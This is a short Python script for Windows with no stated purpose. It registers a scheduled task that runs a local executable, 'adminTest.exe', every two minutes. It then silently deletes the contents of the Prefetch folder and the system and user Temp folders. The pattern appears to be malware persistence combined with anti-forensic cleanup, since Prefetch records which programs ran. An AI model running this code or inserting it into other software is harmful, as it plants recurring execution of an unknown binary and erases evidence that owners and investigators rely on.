import os

ruta = os.getcwd() + "\\adminTest.exe"
os.system(r"schtasks /f /create /tn empanadas /sc minute /mo 2 /tr " + ruta)
os.system(r"del /s /f /q C:\Windows\Prefetch\*.* > Nul 2>&1")
os.system(r"del /s /f /q C:\Windows\Temp\*.* > Nul 2>&1")
os.system(r"del /s /f /q C:\Users\%USERNAME%\AppData\Local\Temp\*.* > Nul 2>&1")